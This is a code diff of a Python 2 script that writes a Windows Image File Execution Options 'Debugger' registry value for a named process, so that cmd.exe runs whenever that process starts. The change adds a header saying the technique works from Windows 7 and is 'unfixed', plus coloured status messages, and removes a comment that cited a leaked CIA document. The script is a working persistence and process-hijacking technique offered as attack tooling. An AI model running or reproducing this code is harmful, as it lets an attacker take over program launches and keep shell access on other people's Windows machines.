@@ -1,24 +1,39 @@
 """
-https://wikileaks.org/ciav7p1/cms/page_2621770.html
-
-Registry key that was designed to assist with debugging and allows the user
-to specifiy an executable that should be run instead of the specified application.
+Works from: Windows 7
+Fixed in: unfixed
 """
 import os
 import _winreg
+from colorama import init, Fore
+init(convert=True)
 
-def cmd_path():
-	path = "c:/windows/system32/cmd.exe"
+payload = "c:\\windows\\system32\\cmd.exe"
+
+def successBox():
+	return (Fore.GREEN + '[+]' + Fore.RESET)
 	
-	if (os.path.isfile(os.path.join(path)) == True):
-		return os.path.join(path)
-	else:
-		return False
+def errorBox():
+	return (Fore.RED + '[-]' + Fore.RESET)
 
-def image_file_execution(executable):
+def infoBox():
+	return (Fore.CYAN + '[!]' + Fore.RESET)	
+	
+def warningBox():
+	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+def ifeo(processname):
+	print " {} ifeo: Attempting to create registry key".format(infoBox())
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",executable))
-		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,cmd_path())
+		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
+					os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
+					processname))
+		_winreg.SetValueEx(key,
+				"Debugger",
+				0,
+				_winreg.REG_SZ,
+				payload)
 		_winreg.CloseKey(key)
+		print " {} ifeo: Registry key created".format(successBox())
 	except Exception as error:
+		print " {} ifeo: Unable to create registry key".format(errorBox())
 		return False
